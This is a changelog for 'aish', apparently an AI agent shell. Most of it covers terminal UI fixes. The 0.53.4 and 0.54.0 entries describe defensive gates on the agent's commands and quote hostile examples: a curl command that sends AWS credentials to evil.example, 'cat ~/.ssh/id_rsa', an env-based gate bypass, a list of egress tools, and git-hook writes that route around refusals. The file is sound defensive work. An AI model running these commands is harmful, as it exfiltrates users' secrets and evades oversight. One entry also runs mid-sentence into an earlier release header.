# Changelog

All notable changes to aish are documented here. Dates are the GitHub release published dates (UTC). Burned/failed release tags that never shipped valid assets (v0.18.1, v0.18.3, v0.19.0, v0.48.0) are intentionally omitted. `v0.48.0` is permanently unusable: the tag name was consumed by an immutable release that was later deleted, so GitHub's pre-receive hook now rejects any attempt to recreate the ref (`tag_name was used by an immutable release` / `Cannot create ref due to creations being restricted`). The 0.48.0 work shipped as **0.48.1**.

## [Unreleased]

## [0.72.0] - 2026-10-25

### Added
- **Version provenance is visible: a channel chip on the statusline and a new `:version` command.** The statusline printed a bare `aish v0.71.2` with no channel, so a dev snapshot six commits past the tag looked exactly like the published release. New `src/version_fmt.rs` derives provenance from the build-time `AISH_RELEASE_TAG` (now baked by `build.rs`) plus `CARGO_PKG_VERSION`: `build_channel()` classifies the tag into `prod` / `dev` / `ci` / `local`, dev snapshots render as `0.71.2+dev.6` and CI as `0.71.2+ci.<run>.<sha>`, and the statusline appends a channel chip for every lane **except** prod — release is the default expectation, so chipping it would burn a permanent statusline token for zero information. `+dev.6` uses semver *build metadata* rather than a prerelease suffix: it sorts as `0.71.2` and can never be mistaken for the `v0.71.2` release, which is the whole point. New **`:version`** (alias `:ver`) reports version, build channel vs tracked update channel, the baked tag, the canonicalized `current_exe()` — installs are routinely a symlink on `PATH`, and printing the link would leave "which aish am I running?" open — and the active model; it is registered in `:help` and command completion (#1085).
- **The `[pasted N lines]` marker is inspectable instead of a one-way door.** A multi-line bracketed paste collapses to a one-line stub so a 400-line paste doesn't flood the composer, but the payload was stashed by `repl.rs` and only swapped back by `editor.rs` **on submit** — a *pending* paste could not be re-read, no command could expand it, and the committed scrollback echo recorded the **stub**, permanently losing what was pasted. New `src/paste_registry.rs` owns both halves: `stash` mints a collision-free marker (per-length disambiguation `#2`, `#3`, …) and passes single-line pastes through untouched; `expand` swaps markers back in line order and does **not** recurse into inserted payloads, so clipboard text that looks like a marker is data, not a placeholder; `clear()` runs at the start of every `read_line`, so a marker can never resolve against a stale payload. **`Ctrl-E`** expands the pending paste in place, falling through to its ordinary readline `EndOfLine` meaning when no live marker is on the line, so the chord is never stolen outright. The committed input echo expands markers too, making scrollback self-contained: `style::input_echo_block` now returns the **rows** of a multi-line band and `terminal::unpark_input_row` advances `BODY_ROW` by the block height so the band can't collide with the following output (#1089).

### Changed
- **The activity stream shows what the shell did, not what the engine thought.** Three changes to the default view: tool output stays collapsed (`raw_tool_output` remains the explicit opt-in) but the collapsed summary now accounts for **every** line `Ctrl-O` would reveal, so the summary and the expanded view agree; **failed (`✗`) calls auto-expand their first 3 non-blank lines** beneath the header, because making the operator press `Ctrl-O` to learn *why* something broke is the one case where collapsing costs more than it saves — the remainder is relabelled `N more lines` so head + summary always sum to the full body, and a short error that fits entirely in the head drops the dangling summary row; and per-round engine diagnostics (prompt-cache hit lines, serial-chain-guard and call-budget-guard advisories) move behind a persisted **`:verbose`**, off by default, with `AISH_VERBOSE` overriding for one run. Nothing load-bearing is hidden: a guard **yield** that actually stops the turn still prints unconditionally, the soft call-budget warning is still folded into the next round's prompt, and the cumulative cache hit rate stays on the statusline and in `:context` — only the chatty per-round advisories are gated. `engine::verbose()` is a process-wide atomic rather than a `Session` field because its hottest consumer, prompt-cache telemetry in `backend::claude`, parses a model response with no `Session` in scope (same shape as the existing `QUIET_SUMMARY`) (#1079).
- **The startup `:help` / `:workers` hint moves onto the statusline.** It was a scrollback line that every session paid for once and then read past forever; the statusline carries it without consuming transcript (#1093).
- **The footer rule label drops the worker emoji.** One glyph per concept — the tray rows already carry the rocket, so repeating it on the rule was noise (#1084).

### Fixed
- **The prompt no longer points the operator at `:jobs` for background workers.** Background coordinators are surfaced by `:workers` and the escalation tray; `:jobs` lists `run_program` background jobs, so the hint sent operators to the wrong list (#1094).
- **Dispatching a background worker no longer stalls the prompt waiting for a name that cannot exist yet.** #1071 taught the liftoff banner to name the worker the way the tray names it by polling the durable coordinator row for the model-written title, with a bounded 5s grace. The grace was unwinnable in the common case: the title is written by the coordinator **subprocess** only after it re-execs aish, opens the store, takes its own `git worktree` (serialized behind the repo's `index.lock`), resolves a credential and finishes a model call — seconds, and in a fan-out every launch is additionally spaced by the spawn stagger. So the poll almost never resolved; it just blocked the REPL thread for the full budget and then printed the clipped brief anyway, once per dispatch and N times across a wave — the "significant delay right after the `🚀 dispatched to background worker w_…:` line". The grace is now a **glance, not a stall**: 600ms by default, long enough to pick up a title that is *already* stamped (a re-dispatch, a resumed run, a child that booted during the arrow sweep), never long enough to hold the prompt. `liftoff_label` also resolves **before** sleeping, so an already-settleable label (`--no-db`, a stamped title, an exhausted grace) costs zero wall-clock instead of one mandatory frame. Nothing is lost when a title lands late — the tray row and `:workers` swap it in the moment it appears (`refresh_escalation_status`); only the static scrollback line keeps the brief. Tunable via `AISH_LIFTOFF_TITLE_WAIT_MS` (`5000` restores the old wait-for-the-name behaviour, `0` skips the poll entirely); an unparseable value degrades to the default, so a typo can neither disable nor unbound the wait. The arrow sweep is unchanged — a zero grace still plays the animation in full (#1083).
- **Typing during the liftoff banner lands in the input instead of on the screen.** The banner animates in place with `\r` rewrites while the tty still had echo enabled, so keystrokes typed during the sweep were painted over the animation and then re-appeared in the composer. Echo is suspended for the duration of the banner and restored after the final frame (#1080).
- **Shift-Tab no longer flashes the screen while cycling the tray.** The cycle repaints the tray and the input band in several steps; each one reached the terminal separately, so a fast press showed a torn intermediate frame. The repaint is now wrapped in DEC private mode 2026 (synchronized output), making the whole cycle one atomic update on terminals that support it and a no-op escape pair everywhere else (#1082).
- **A mid-turn paste queues as one action, not one queued command per line.** The mid-turn queue consumed the composer line-by-line, so a 40-line paste submitted during a turn enqueued 40 separate actions. The paste is queued as a single action, matching what the operator submitted (#1086).
- **One blank row is kept between body output and the footer's top rule.** The last line of output could sit flush against the rule, reading as part of the footer frame rather than as transcript (#1087).
- **The choice popup owns the tty while it is up.** The keywatch reader stayed live underneath the popup and raced it for keystrokes, so an arrow or Enter could be consumed by the wrong reader. The reader is parked for the lifetime of the popup and resumed when it closes (#1088).
- **The tray heart beats off the resumed worker's current thread.** After an in-place resume the liveness heart was still fed from the prior thread's last beat, so a healthy resumed coordinator rendered as stale (#1090).
- **A resumed worker continues in the SAME session instead of taking a fresh worktree.** Resume re-execed into a new session with a new `git worktree`, so the resumed run lost its workspace — including any uncommitted work — and paid the worktree-creation cost again. Resume now continues in the existing session and worktree (#1091).
- **Sub-workers dispatched by a resumed coordinator thread are pinned to the tray.** They were parented against the pre-resume thread id, so the tray had no matching parent row and the children were dropped from the forest walk instead of nesting under their coordinator (#1092).

## [0.71.1] - 2026-10-25

### Fixed
- **The submitted-input highlight paints as one contiguous band.** The `▄`/`▀` framing rows from #1052 were font *glyphs* drawn in the band shade as a foreground colour, so a glyph only covered what the font actually drew — with line spacing above 1.0 (or a font whose block elements don't fill the cell) a seam opened between the echo row's background and the half-block, reading as highlighted line → dark gap → thin strip. `style::input_echo_block_with` now paints all three rows (pad / echo / pad) as **background fills** via `band_row`; cell backgrounds always tile flush, so the band is one solid rectangle in every terminal and font. `BAND_LOWER_HALF` / `BAND_UPPER_HALF` / `band_fg_from_bg` are removed. Row count is unchanged, so the `BODY_ROW` math in `unpark_input_row` is unaffected, as are the `AISH_INPUT_HIGHLIGHT_BG` knob and plain/`NO_COLOR` mode (#1069).
- **Status lines no longer weld themselves onto the live thinking spinner.** The thinking `Spinner` paints `\r<frame> thinking…` with no trailing newline, so a plain `eprintln!` emitted from inside `complete()` — per-turn cache telemetry, retry notices, rate-limit warnings, token-refresh notices — was appended to the spinner frame; the spinner's `\r\x1b[2K` erase on drop then hit the row *below*, stranding a dead `⠏ thinking…  cache: … → … out` row in the transcript above the tool calls. `engine.rs` gains an `ANIM_ROW_LIVE` flag (set while `Spinner`/`QuietSummary` own the row, cleared on drop) and a `status_eprintln!` macro that writes the erase first when an animation is live, with the erase and the line going out under **one** stderr lock so a spinner tick can't interleave. Every `eprintln!` in `src/backend/{claude,grok,openai,local}.rs` routes through it — a drop-in replacement with identical output when no animation is live, which includes non-TTY runs and workers (#1070).
- **The liftoff banner names the worker the way the escalation tray names it.** The banner and the tray announce the same launch, so they must name it the same way — but the tray's head row shows the coordinator's model-written title while the banner printed the raw task brief, so one worker wore two names and a brief opening with pasted context rendered as `🚀 escalated to background worker w_…: === Recent conversation context (for reference —…`. The title is written by the coordinator **subprocess** moments after boot, so the parent cannot have it at spawn time; `print_liftoff_banner` now polls the durable coordinator row for it and **spends the wait animating** — the launch appears instantly against the clipped brief and settles into the resolved title in the final frame, so the wait costs nothing visible. Guard rails: no title (no Claude credential) falls back to the clipped brief after a bounded 5s, `min_frames` plays the arrow sweep in full before the first poll so a fast title can't swallow the animation, `--no-db` returns the brief immediately, and off a TTY there's no animation but still a wait so a piped transcript names the worker the way `:workers` does. Both dispatch paths go through the same banner (#1071).
- **Resumed workers keep their transcript, so `:attach` replays history.** `WorkerJob::reset_for_resume()` called `transcript.clear()`, but the transcript ring is *exactly* what the `:attach` backfill cursor replays (TASK-298 — attach replay and the live stream read the same ring), so an in-place resume wiped the attachable history and the pane sat on the thinking spinner under a `replay, then live` header with nothing to replay. Resume now retains the prior thread's rows and pushes a visible `━━ resumed · thread N ━━` boundary marker instead of clearing; the ring's existing line/byte caps still bound growth across repeated resumes. To avoid double-printing, the resumed run's stderr stream seats its live cursor at the ring's current write pointer (`TranscriptRing::live_cursor_now()` / `WorkerJob::live_cursor_now()`) instead of `LiveCursor::default()`, so retained rows reach the operator through the attach backfill only and are never re-forwarded live — for a fresh run the ring is empty, making the seated cursor byte-identical in behaviour to the old default (#1072).
- **Shift-Tab cycles up the escalation tray instead of spawn order.** The rotation was keyed off `collect_worker_rows` (newest parent first, sub-workers appended after their parent), which only coincides with the *painted* tray while nothing is phase-grouped — so once the tray grouped rows by lifecycle phase (#1065) the first press landed on a row that wasn't the one directly above the prompt. The rotation is re-keyed to the tray's own geometry: `escalation::tray_order_ids()` returns pinned run ids in tray *paint* order using the same phase grouping and parent nesting as `rows`, minus visible-row truncation so hidden overflow rows keep their slot (queued rows are omitted — no worker to attach to), and `repl::tray_cycle_order()` / `sort_rows_tray_order()` reverse it so press 1 is the bottom row and each further press climbs up, with ids absent from the tray keeping their incoming relative order at the tail so every live coordinator stays reachable. Both `cycle_worker` and `cycle_worker_live` sort through it, so a mid-turn press and an at-the-prompt press agree; wrap-to-interactive is unchanged and now happens after the *top* tray row (#1073).

## [0.71.0] - 2026-10-24

### Added
- **The `:attach`ed worker wears the operator-input band in the escalation tray.** "The thing you're talking to" now reads identically in the tray and in the transcript. The submitted-input band is factored out of `style::input_echo_block_with` into `band_row` (edge-to-edge fill + embedded-reset re-arming) with a runtime `highlight_row` wrapper that hands the row back untouched when colors are off — degrade, never mangle. `src/escalation.rs` gains a process-global `ATTACHED` slot (same rationale as `BANNERS`: every paint path needs it, including the idle heartbeat, which has no `Session`) with `set_attached` / `attached`; `rows()` reads it once per paint and bands **both** rows of the matching pair so it reads as one block, leaving sibling banners untouched. `src/repl.rs` mirrors the slot from the **existing** attach-transition watcher — one site that already observes all ~9 writers (attach, detach, Shift-Tab cycle, goal attach, worker completion) rather than patching each. No new lock ordering: `ATTACHED` is a separate mutex and nothing takes `BANNERS` while holding it. Re-attach moves the band instead of adding a second one; detach restores the plain tray (#1066).
- **The dispatch banner wears the escalation rocket and names the task that left.** `🛫 dispatched to background worker w_… - keep working here; Shift-Tab to see work.` becomes `🚀 dispatched to background worker w_…: fix the flaky activity-summary test`. One glyph for one concept — `LIFTOFF_GLYPH` is now an **alias** of `escalation::LIVE_GLYPH` rather than a re-typed emoji, so the launch notice and the tray row it becomes cannot drift. The instructional tail is learned once and then read past on every launch; the one fact the line can't be reconstructed without is *which* task left, so that is what the tail carries. New `liftoff_summary(task, budget)` collapses whitespace first (a pasted multi-line brief must not smear the animation's in-place `\r` rewrites across rows) then clips on a word boundary via `activity_summary::clip_words`; `liftoff_banner_body(verb, short, summary)` dims the summary and drops the colon along with an empty brief. Dispatch and escalation stay one visual family — same glyph, same animation, same summary tail, differing only in the verb (#1064).
- **`:tell` gets a megaphone banner, matching the worker-event family.** Steering an in-flight coordinator now renders in the same banner vocabulary as dispatch and escalation instead of a bare notice (#1062).
- **The pinned escalation tray is sized off the window, not a fixed row count.** The tray was capped at a constant number of banners, so a tall terminal wasted the room and a deep fan-out was silently truncated. It now extends to half the terminal height (#1061).

### Changed
- **The escalation tray groups rows by lifecycle phase and repaints on content change.** Strictly newest-first ordering buried the row the operator actually needs: the rows are not interchangeable — a **running** coordinator is the only one whose contents can still change, a **failed** one is the only one that wants a decision, and **done**/**starting** rows are bookkeeping. `tray_rows` assigns each banner a `Phase` and groups the forest walk by it, so reading **up** from the prompt gives `starting → done → failed → running`; the phase sort is stable and the input is already newest-first, so newest-first is preserved *inside* each group, and grouping happens at the root level so a sub-worker never floats out of its subtree. Independently, the footer heartbeat only requested a repaint while something was *animating* — the right gate for a spinner, the wrong one for a **content** change, so a late `done → failed` flip (now also a stale *order*) sat unpainted until the operator happened to press a key. A `dirty` flag raised by `set_status` / `set_task` / `note_terminal` and consumed once by the heartbeat buys exactly one frame per batch; the mutators **compare before storing**, because the REPL re-composes every row on every paint and a dirty-on-write would pin the flag high and busy-loop the footer. Status rows separate the state cell from the free-text message with ` · `, degrading to a single space when the state cell is empty so the message column never shifts (#1065).
- **The escalation tray's status subline has a fixed-width beat column and one duration vocabulary.** The leading **beat** cell was the last ragged column and the worst one — it sits first, so every field to its right inherited its jitter, and because a healthy heart is one cell (`♥`) while a missed-beat heart carries its age (`♥ 20m00s`), two rows of the same tray started their runtime column up to seven cells apart and a *single* row twitched sideways between paints as its worker went stale. New `escalation::BEAT_COL = 8` (glyph + space + the 6-cell duration ceiling) and `escalation::pad_styled`, which pads an **already-styled** cell by measuring visible width around the escapes — `col()` can't be used, as it strips ANSI to measure and would discard the colour that *is* the liveness signal. Second, two duration formatters were visible side by side on that same row (`escalation::fmt_elapsed` printing `3m40s`, `style::compact_age` printing `20m` and silently discarding the sub-unit); all duration rendering now collapses into one `style::fmt_duration` — two significant units, zero-padded, never wider than 6 cells inside a day (`45s` · `1m12s` · `3h04m` · `2d03h`), which is what lets a caller size a fixed column for it. Queued and terminal (`↳`) rows ride the same fixed beat cell. The two-line layout is unchanged: line 1 (emoji · worker · summary) is untouched. **API change:** `style::compact_age` is removed and `style::fmt_duration` now takes `i64` (was `u64`), clamping negatives to `0s` so callers stop writing `.max(0) as u64`; both are crate-internal and all four call sites are updated. Duration labels change everywhere they appear (`:workers` Beat column, `background_status`, the tray): `20m` → `20m00s`, `3h` → `3h00m`, `2m 30s` → `2m30s` (#1067).
- **`aish-webhook-broker` dependency group bump, with the Dockerfile toolchain unpinned.** Supersedes the Dependabot bump (#1019), which had been red since it was opened: the broker's `Dockerfile` pinned `rust:1.88-slim-bookworm` while the group bump pulls `uuid` 1.28, whose MSRV is rustc 1.89, so `docker build` failed at dep resolution. Dependabot can't fix that — the lockfile bump is correct and the *toolchain pin* is the defect, and any future bump touching an MSRV-raising dep would break identically. This cherry-picks the #1019 lockfile bump verbatim (14 updates) and unpins the builder stage to `rust:slim-bookworm`, leaving the reproducibility guarantee where it belongs (`Cargo.lock`, which Dependabot keeps current) instead of a tag that was pinning the build *behind* its own dependencies (#1058).

### Fixed
- **The ⏰ alarm badge no longer stays lit forever from orphaned monitors.** The SecondStatusLine alarm glyph is driven by `AlertStore::armed_alerts()`, which is **global** — it reads every row whose `state='armed'`, not just the current session's — and nothing in aish could ever retire a row whose watcher was gone. A semantic `:alert` is resolved by a delegated background coordinator calling `set_alert`; when that coordinator exits without firing (the run ends, the host restarts, the condition is already moot), the row stays `armed` for good. Native probes are polled only by the session that armed them, so they orphan the same way. The live database had **35** such rows, the oldest armed 2026-07-07 — so every new session started with the alarm icon on, pointing at CI runs and PRs from three months earlier. New `AlertStore::expire_stale_alerts(max_age_secs)` flips `armed` → `cancelled` for every row older than the horizon (`STALE_ALERT_SECS` = 7d; rows predating the `created_at` column default to `0` and are therefore always swept) in one indexed UPDATE — idempotent, so it is safe to call repeatedly. It runs at **startup** before anything reads the table (with a dim startup notice naming the count, so the sweep is never silent) and **hourly** from the presenter loop, so a session left up for days doesn't re-accumulate a stuck badge. `:alert list` grows an **AGE** column (via `tools::human_age`, the same renderer `stat_file` uses) and footers a warning when any armed row is past the horizon — an aged armed monitor is the diagnostic that makes a stuck ⏰ self-explanatory rather than mysterious. `:alert prune [days]` is the operator's manual handle on the same sweep, defaulting to 7 days.
- **The session label paints on the main footer rule only.** The `:rename` label (with its live 🤖 / ⏰ / 🎯 badges) was leaking onto the tray's bracket rows as well as the main rule, so a framed tray showed the name up to three times in one paint. A new `plain_rule_like` helper recovers the rule glyph from the string itself (first visible char, ANSI skipped — so the unicode `─`, the ASCII `-` fallback, and the geometry tests' own `"----"` separators all work), strips the label, preserves the decorated rule's visible width, and keeps the `\x1b[2m` dim wrapper when the input had one; it is a pure function of its argument, so `footer_seq_with` stays a pure escape-sequence builder. Both bracket rows now paint plain: the tray still reads as a framed panel, and the label lands only on the main rule. A test forces all three rules into one paint and asserts the name and each badge appear exactly once (#1060).

## [0.70.1] - 2026-10-24

### Added
- **The escalation tray nests sub-workers under their parent coordinator.** When a pinned coordinator fanned work out to its own background workers, those children were **invisible** — they run in their own processes, so they never appeared in the parent's `jobs` map and never got a tray row. `src/escalation.rs` rows now carry an optional `parent` id (`pin_sub()` alongside `pin()`), `rows()` paints a depth-first **forest** (each parent followed by its indented children) instead of a flat list, and `render_sub()` composes a child's head row from a `↳` arrow + glyph + title and prepends `SUB_INDENT` to the status row so the child's heart lands under the child's glyph rather than its parent's. The child's own `w_…` id is deliberately **not** painted — the arrow and indent already attribute the work, so a sub-row spends its horizontal room on what you can act on: timer · status · summary. Indent depth clamps at `MAX_SUB_DEPTH` so deep nesting still paints without marching off the right edge, and a child whose parent is no longer tracked (evicted or retired) falls back to a **root row** rather than vanishing, because it is still live work. `repl::refresh_escalation_subworkers()` discovers a pinned coordinator's children from the durable coordinator table on the footer paint path and routes them through the same summarize + status + `note_terminal` path parents already use; sub-rows are re-read into `refresh_escalation_beats()` in the **same** pass they are pinned, so a fresh child never paints hollow waiting for the next poll window (#1054).
- **The submitted input line is highlighted with a framed grey band.** Input echoed into the transcript as a bare line, so after a few turns it was hard to scan back and find where the last input was. The echo is now painted with a grey background spanning the **full terminal width**, framed above and below by a **half-row** band rather than a full blank highlighted row — so it reads as one highlighted line with a thin shade hugging it, not a fat three-row block. The framing rows carry no background at all: they are `▄` (U+2584) / `▀` (U+2580) glyphs drawn in the band shade as a *foreground* color, so each cell is half band, half terminal default, and net visual height is 2 rows of shade instead of 3. `style::input_echo_block_with()` builds the three rows as pure form, pads each to `cols`, and re-arms the background after every embedded `ESC[0m` on the echo row so the prompt's own cyan/green colors cannot end the band mid-line; `band_fg_from_bg()` re-aims the `48;5;{idx}` background SGR at the foreground (`38;5;{idx}`) for the framing rows and passes anything it does not recognise through unchanged. `terminal::unpark_input_row()` writes the block instead of the bare echo and advances `BODY_ROW` by the block height, clamped to `layout.body_bottom` so it still scrolls correctly on the last body row. `AISH_INPUT_HIGHLIGHT_BG=<0-255>` overrides the xterm-256 shade (default `237`); under `NO_COLOR` or off a tty there is no SGR at all and the framing rows stay **empty strings**, so plain-mode transcript spacing is unchanged (#1052).
- **The escalation status row is column-aligned.** The worker-tray status row was a ` · `-joined sentence, so the activity text started at a different screen column on every banner and the lifecycle word was buried mid-string — with several workers pinned the eye had to re-scan each row from the left on every paint. The row is now a **table**: fixed `RUNTIME` (8 cells) and `STATE` (7 cells) columns, then the free-text message. No line got shorter — `MESSAGE_COL = STATUS_MAX`, so the free-text cell keeps the exact budget it had before, and the fixed columns are additive. Padding is measured in terminal **cells** (`unicode_width`), not chars, so a CJK or emoji status cannot shove the next column out of alignment. `split_status` is deliberately conservative: worker status arrives pre-joined as `"<state> · <activity>"`, and the leading token is peeled into the state cell **only when it is a known lifecycle word** — an unrecognised head stays whole in the message cell rather than being silently promoted into the state column. Queued rows share the layout through the same `status_cells()` helper, so a queued line's columns land on the live banners' columns. `STATE = 7` fits the common phases (`running`, `pending`, `queued`, `done`, `failed`, `stopped`); the two long ones clip unambiguously (`coordinating` → `coordi…`, `awaiting_batch` → `awaiti…`) in exchange for seven cells of indent saved on every other row. Tests assert exact column positions rather than substring containment, so a future regression in cell width fails loudly (#1053).
- **The `:rename` session label is welded into the footer's horizontal rule.** The name no longer right-justifies on the 2nd statusline, where it ate that row's right half and read as a word parked at the end of a line; it now sits **inside the rule** ~2 columns from the right edge with the rule continuing on **both** sides of it, so it reads as part of the frame and the statusline gets its full width back for the coordinator hint and plugin segments. New `terminal::separator_line_labeled()` (pure geometry) plus `RULE_LABEL` process state, `set_rule_label()` / `rule_label()`, and `separator_line_current()` — **every** footer paint site now routes through it, so the label cannot land on one row plan and not the other. `repl::coordinator_status_message` hands the decorated name (with live 🤖 / ⏰ / 🎯 badges) to `set_rule_label` and returns the coordinator hint clipped to the full footer width; `style::second_statusline_at` and its tests are removed, making that row pure left-zone content again. Geometry degrades, never corrupts: 2 cols of rule kept to the right, ≥4 required to the left, escape-aware clip of an over-long label, and a plain-rule fallback when the window is too narrow to frame anything. The name keeps its bold-magenta accent, the rule stays dim, and because color codes are zero-width the painted row still measures exactly `cols` (#1051).

- The window-resize **ghost escalation banner** is gone. Navigating away from the terminal and back — i.e. any resize while a worker banner was pinned — could strand a duplicated `🚀 w_… · <task>` row above the live footer. `footer_seq_resized()` fed the layout installed for the **old** height into the tray-transition choreography, so every row in that stale plan (body floor included) was offset from the new plan by the height delta; the transition concluded the tray had grown or shrunk by the whole delta and emitted a region-scoped `SU`/`SD`, which dragged the transcript and smeared chrome the emulator had **already reflowed**, leaving banner rows the new plan no longer paints sitting in the band as a ghost — often doubled, since the banner was both smeared and repainted. ## [0.54.0] - 2026-10-09

Two features, one per track. The exec gate stops being a boolean: a `bool` could say *ask* or *don't ask* but never *no*, which is why the egress and sensitive-path classifiers that shipped in 0.53.4 were wired to stubs — there was nothing for them to return a refusal to. `Gate { Allow, Confirm, Refuse }` closes that, the two classifiers are live, writes whose content executes later (`.git/hooks/**`, `.github/workflows/**`, `.git/config`) are refused ahead of every grant, and every refusal and confirm is now recorded in telemetry so the rules can be tuned against real data instead of guesses. On the surface side, the input line gets a dedicated footer row at `H-2` and keeps it in every state of the shell, so the one thing the operator aims their hands at stops moving with the transcript.

### Added
- **The exec gate can say _no_, the stubbed classifiers are wired, and every refusal is measured** (PR #936, TASK-943 / SEC-2.1 / F-01): the tool gate was a `bool`, so it could say *ask* or *don't ask* but had no way to say *no* — every refusal therefore lived as an out-of-band `bail!` beside the gate at each call site, and a call site that grew a new gate without the matching `bail!` silently downgraded a refusal to an allow. `Gate { Allow, Confirm, Refuse }` is now computed **once**, in `exec_gate()`, for `run_program` / `run_interactive`, before secrets are resolved and before any grant is consulted; mode policy still lives in `exec_needs_confirm()` — still the only place a `Mode` is matched — so the third value is *added* rather than any decision being re-made. With a gate that can refuse, the two classifiers that landed in 0.53.4 stop being stubs: `is_egress_class()` and `is_sensitive_path_class()` were `return false` with `// TODO`, and the egress classifier (PR #932) and sensitive-path classifier (PR #934) are now called for real, with the two `#[ignore]`d refusal tests live. Three spellings of "is this run unattended" — egress keyed off `session.nested`, sensitive-path off `session.nested || is_unattended()`, and the path gate rebuilding that expression inline — converge on the single broader `is_unattended()`; predicates that can disagree about the same run are the same bug class as a gate that cannot tell *no* from *ask*, since whichever one a new call site happens to pick becomes the policy. **Writes whose content EXECUTES later are refused** — `.git/hooks/**`, `.github/workflows/**`, `.git/config` — checked ahead of all grants and regardless of workspace membership, because those paths *are* in-workspace, so the "in-workspace writes are allowed" rule let a coordinator write a git hook or a CI workflow and have the next git operation (or CI, with CI's credentials) execute it, routing around every exec refusal; no `a` tool-allow or `d` directory grant waves it through, interactive runs confirm — this is the one deliberate addition on the yolo path — and unattended runs refuse. The `env` bypass is closed for the glued GNU forms: `env --split-string='sh -c …'` contains `=` *and* starts with `-`, and `-Ssh -c …` is a single token, so both slipped past the old bare-command-word heuristic; the transparent `env FOO=1 cmd …` form still has its real command judged. `no_wildcard_mode_match` is replaced by `#[deny(clippy::wildcard_enum_match_arm)]` — the test `include_str!`'d `tools.rs`, cut the function body at the first `"\n}\n"` and grepped for the literal `_ =>`, so it was brittle to reformatting and blind to `_other =>` or a catch-all binding; exhaustiveness is now structural, and a new `Mode` stops the build until its policy is written down. Finally, every `Gate::Refuse` and `Gate::Confirm` writes a `tool_telemetry` row — `error_class='gate-refuse'` / `'gate-confirm'` — carrying the rule that fired and a normalised, bounded `bin[:subcommand]`, through the *existing* buffered writer rather than a second path into the table; no argv is stored, deliberately, so `cat ~/.aws/credentials` logs `cat` and never the path. Without it there is no way to answer "which rule refuses what, and how often?", which is a hard prerequisite for tuning a seed allowlist. Deny-by-default `Mode::Unattended` is **not** in this release — the breaking half, including the `--unattended` flag, the seed allowlist and the `AISH_UNATTENDED_ALLOW` plumbing, is tracked separately on ISS-410409, so no existing mode's effective behaviour changes here.

### Changed
- **The input line is pinned to a fixed footer row, in every state of the shell** (PR #952): the prompt used to live wherever the transcript happened to end, so it moved with every scroll, every tool call, and every state change (interactive vs. worker vs. coordinator vs. mid-turn type-ahead) — the one thing the operator aims their hands at was the least stable thing on screen. The footer now owns a dedicated **INPUT row at `H-2`** — third line up from the bottom, directly **below** the horizontal rule (`H-3`), above the status message (`H-1`) and the statusline (`H`) — and it is **unconditional**: `LAST_PROMPT` caches the prompt string so every repaint (idle heartbeat, resize, post-clear restore, mid-turn status update) redraws the resting affordance there even when nothing is being typed. `park_input_row` / `unpark_input_row` move the line editor onto that row for the duration of a read and hand the cursor back to the body afterwards; because the row sits OUTSIDE the DECSTBM region, the submitted command is echoed into the body on submit so scrollback stays honest, and `print_in_body` routes above-the-prompt output straight into the transcript (DECSC/DECRC) instead of letting rustyline's `ExternalPrinter` erase-and-redraw a prompt that is no longer in the body. `BODY_ROW` remembers where the transcript left off (one bounded DSR probe per park, advanced per body write, clamped into the live body on read, degrading to "keep writing at the bottom"). Precedence on the row is: the live editor while reading → mid-turn type-ahead → the cached resting prompt. Every helper no-ops when no footer region is installed (off-tty, short windows, pre-enable), so inline behaviour is unchanged there.

## [0.53.4] - 2026-10-08

The security-gate release. Four axes of the SPR-126 hardening sweep land together: network egress is classified on its own merits instead of riding in under the destructive-verb check, credential and key paths are denied in *every* mode including yolo, `${profile:KEY}` secret resolution becomes deny-by-default with an audit trail, and a process-wide redaction filter scrubs captured output before it reaches the model, the transcript, or the history DB. Alongside that: an opt-in reclaim path for leaked worktrees (96 GB measured on a live box), readable worker branch names, a `read_file` guard that degrades instead of refusing, and the ticker/footer repaint fixes that stop the statusline and escalation tray disappearing mid-turn.

### Added
- **Network egress is classified in the tool gate** (PR #932, TASK-944 / SEC-2.2 / F-04): `curl -d @~/.aws/credentials https://evil.example` was classified non-destructive and ran silently in Normal mode — exfiltration needs no destructive verb, so the single destructive axis could not see it. A new egress axis covers `curl`, `wget`, `httpie`, `xh`, `aria2c`, `nc`/`ncat`/`netcat`, `socat`, `telnet`, `openssl`, `ssh`/`scp`/`sftp`, `rsync`, `rclone`, `ftp`/`tftp`/`lftp`, and `git-remote-http(s)`. `egress_target(bin, args)` parses argv per binary and fails **open to `<unknown>`** — the gate never fails to *classify*, only to name the host. Loopback (`localhost`, `127.0.0.0/8`, `::1`, `0.0.0.0`, `*.localhost`, bare `.local`) is carved out by string/IP-literal comparison only; no DNS resolution happens inside a security check. `curl`/`wget` are removed from `READ_ONLY_PROGRAMS` (an uploader must never be provably read-only), and the prompt names the host on its own line with the direction in uppercase (**SEND DATA to** vs **fetch from**). Paranoid/Careful/Normal confirm, Yolo allows, unattended and coordinator paths refuse.
- **Sensitive-path denylist, gated in every mode** (PR #934, TASK-945 / SEC-2.3 / F-09): credential, key, and identity paths are no longer silently reachable. `src/sensitive.rs` classifies the **canonicalised** path (deepest-existing-ancestor canonicalisation plus lexical normalisation for not-yet-existing writes, symlinks and every intermediate component resolved, case-insensitive on macOS/Windows, **fail-closed to Sensitive** on any canonicalisation error), with `.env.example`/`.sample`/`.template` exempted. Classify runs FIRST and grants SECOND, so an ancestor `d` grant or a tool `a` allow can never cover a sensitive path — the prompt renders only `y/N`. **Read is gated as well as write** (reading `~/.ssh/id_rsa` into model context *is* the exfiltration path), and `run_program` argv is scanned so `cat ~/.ssh/id_rsa` and `tar -cf - ~/.aws` are caught even though the program is benign. This is the one documented exception to yolo's confirm-nothing contract (stated in `:mode` and `--yolo --help`); unattended/coordinator runs refuse outright. aish's own credentials are listed while `~/.aish` and `~/.atum` themselves are not, so session/DB/config writes never prompt.
